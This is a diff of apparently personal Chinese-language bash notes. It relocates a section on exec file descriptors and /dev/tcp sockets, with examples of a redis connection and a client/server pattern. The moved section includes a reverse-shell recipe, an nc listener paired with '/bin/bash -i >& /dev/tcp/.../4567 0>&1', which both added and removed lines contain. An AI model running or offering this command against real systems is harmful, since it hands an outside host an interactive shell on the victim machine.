@@ -1057,7 +1057,9 @@ posix标准要求每次打开文件时必须使用当前进程的最小可用文
 1	stdout
 2	stderr
 
-使用exec自定定义、绑定文件操作符
+使用exec自定定义、绑定文件操作符  
+#管道可以跨进程看到
+#文件描述符只能当前进程看到
 exec 200<>my_pipe   ###对文件200的操作等同于对管道my_pipe的操作。使用绑定文件可以避免停滞
 			
 echo >&200			###以管道使用，输入空行，不停滞
@@ -1074,10 +1076,71 @@ exec >$file         #将标准输出写入普通文件
 exec 3<$file        #将普通文件内容写入管道3
 
 
-read -u n			###从描述符号位n的文件中读取。缺省为0，即为stdin。
+read -u${n}			###从描述符号位n的文件中读取。缺省为0，即为stdin。
+
+
+
+#相当于连接 127.0.0.1 6379
+exec 100<>/dev/tcp/127.0.0.1/6379
+
+#发送消息
+echo info >&100
+
+#关闭连接
+exec 100>&-
+#exec 100<$-
+
+#打开连接时描述文件创建  关闭时删除
+ls -altr /proc/self/fd/100
+
+
+
+反弹shell
+
+#192.168.4.166
+nc -lv  4567  
+
+#192.168.4.165
+/bin/bash -i >& /dev/tcp/192.168.4.166/4567 0>&1
+ 
+#192.168.4.166即可获得192.168.4.165的shell
+ 
+ 
+读写这个文件相当于使用socket建立连接
+/dev/tcp/$target_ip/$target_port
+/dev/udp/$target_ip/$target_port
+
+
+客户端
+exec 100>/dev/tcp/$target_ip/$target_port
+
+#发送
+echo -e "what you want to send" >&100
+
+#接收
+cat <&100
+
+exec 100>&-
+exec 100<$-
+
+
+
+服务端？不可以用
+/dev/tcp-server/$listen_ip/$target_port
+/dev/udp-server/$listen_ip/$target_port
+
+服务端
+
+exec 100>/dev/tcp-server/$listen_ip/$listen_port
+
+cat <&100
+
+exec 100>&-
+exec 100<$-
+
+
 
 read -p "prompt" arg	###输出提示，将输入值传给arg。没有arg则传入REPLY
-
 
 cat filename | while read line		###将文件读入line中，line为变量
 do
@@ -1496,61 +1559,9 @@ echo 0 > /sys/devices/system/cpu/cpu7/online    #禁用某个cpu
 
 
 
-
-
-
 #日志滚动设置
 #逐日存放日志
 /etc/logrotate.d
-
-
-
-
-反弹shell
-
-#192.168.4.166
-nc -lv  4567  
-
-#192.168.4.165
-/bin/bash -i >& /dev/tcp/192.168.4.166/4567 0>&1
- 
-#192.168.4.166即可获得192.168.4.165的shell
- 
- 
-读写这个文件相当于使用socket建立连接
-/dev/tcp/$target_ip/$target_port
-/dev/udp/$target_ip/$target_port
-
-
-客户端
-exec 100>/dev/tcp/$target_ip/$target_port
-
-#发送
-echo -e "what you want to send" >&100
-
-#接收
-cat <&100
-
-exec 100>&-
-exec 100<$-
-
-
-
-服务端？不可以用
-/dev/tcp-server/$listen_ip/$target_port
-/dev/udp-server/$listen_ip/$target_port
-
-服务端
-
-exec 100>/dev/tcp-server/$listen_ip/$listen_port
-
-cat <&100
-
-exec 100>&-
-exec 100<$-
-
-
-
 
 
 
